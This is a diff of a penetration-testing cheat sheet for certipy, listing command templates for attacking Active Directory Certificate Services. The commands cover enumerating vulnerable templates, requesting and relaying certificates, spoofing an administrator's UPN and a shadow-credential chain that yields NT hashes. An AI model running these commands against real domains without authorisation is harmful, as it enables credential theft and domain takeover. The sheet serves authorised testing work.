@@ -2,28 +2,53 @@
 
 % adcs, certificate, pki, windows, Active directory, template, shadow credential
 
-## certipy - list certificate templates
+## enum -  list enabled certificate templates 
 #plateform/linux #target/remote #cat/RECON
 ```
-certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> [-stdout]
+certipy find -enabled  -hide-admins -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> [-stdout]
 ```
 
-## certipy - request certificate
+## enum - list enabled certificate templates (socks)
+#plateform/linux #target/remote #cat/RECON
+add CA to /etc/hosts
+```
+certipy find -enabled -hide-admins -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> -ns <dc-ip> -dns-tcp [-stdout]
+```
+
+## enum - list vulnerable certificate templates 
+#plateform/linux #target/remote #cat/RECON
+```
+certipy find -vulnerable -hide-admins -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> [-stdout]
+```
+
+## enum - list vulnerable certificate templates (socks)
+#plateform/linux #target/remote #cat/RECON
+add CA to /etc/hosts
+```
+certipy find -vulnerable -hide-admins -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> -ns <dc-ip> -dns-tcp [-stdout]
+```
+
+## enum - enumerate to bloodhound (socks)
+```bash
+certipy find -enabled  -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> -ns <dc-ip> -dns-tcp  -old-bloodhound
+```
+
+## request certificate
 #plateform/linux #target/remote #cat/ATTACK
 ```
 certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority>
 ```
 
-## certipy - extract cert from pfx
+## extract cert from pfx
 #plateform/linux #target/remote #cat/UTILS
 ```
-certipy cert -pfx <pfx> -nokey -out <file>.crt
+certipy cert -pfx <pfx> -nokey -out <file>.crt -password <password|jubeaz>
 ```
 
-## certipy - extract key from pfx
+## extract key from pfx
 #plateform/linux #target/remote #cat/RECON
 ```
-certipy cert -pfx <pfx> -nocert -out <file>.key
+certipy cert -pfx <pfx> -nocert -out <file>.key -password <password|jubeaz>
 ```
 
 ## certipy - create pfx from cert
@@ -98,9 +123,9 @@ certipy relay -ca <ca-fqdn> -template 'DomainController'
 certipy account update -u <user>@<domain> -p '<password>' -user <targeted-user> -upn <administrator-user>
 ```
 
-## certipy - Get NT hash - Shadow Credential
+## Get NT hash - Shadow Credential
 #plateform/linux #target/remote #cat/ATTACK
 Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
 ```
-certipy shadow auto -u <user>@<domain> -p '<password>' -account <targeted-user>
+certipy shadow auto -u <user>@<domain> -p '<password>' -account <targeted-user>  -dc-ip <dc-ip> -target-ip  <dc-ip> -target <dc-ip> -dns-tcp
 ```
